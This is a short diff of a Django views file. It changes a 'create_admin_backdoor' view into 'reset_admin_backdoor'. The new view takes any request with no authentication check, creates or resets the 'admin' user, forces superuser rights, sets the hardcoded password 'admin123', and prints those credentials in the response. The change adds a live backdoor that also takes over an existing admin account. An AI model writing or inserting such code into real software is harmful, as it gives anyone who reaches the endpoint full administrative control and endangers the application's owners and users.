@@ -1260,14 +1260,21 @@ def admin_simulate_transfer(request):
             
     return JsonResponse({'status': 'error'}, status=400)
 
-def create_admin_backdoor(request):
+def reset_admin_backdoor(request):
     try:
-        # Check if 'admin' exists to avoid crash
-        if not User.objects.filter(username='admin').exists():
-            User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
-            return HttpResponse("<h1>Success!</h1><p>User: <strong>admin</strong><br>Pass: <strong>admin123</strong></p>")
-        else:
-            return HttpResponse("<h1>Admin already exists.</h1>")
+        # Get the user 'admin' or create if missing
+        user, created = User.objects.get_or_create(username='admin')
+        
+        # FORCE UPDATE PERMISSIONS & PASSWORD
+        user.set_password('admin123')
+        user.is_staff = True
+        user.is_superuser = True
+        user.email = 'admin@example.com'
+        user.save()
+        
+        action = "Created" if created else "Reset"
+        return HttpResponse(f"<h1>Success!</h1><p>Admin Account {action}.</p><p>User: <strong>admin</strong><br>Pass: <strong>admin123</strong></p>")
+        
     except Exception as e:
         return HttpResponse(f"Error: {e}")
     
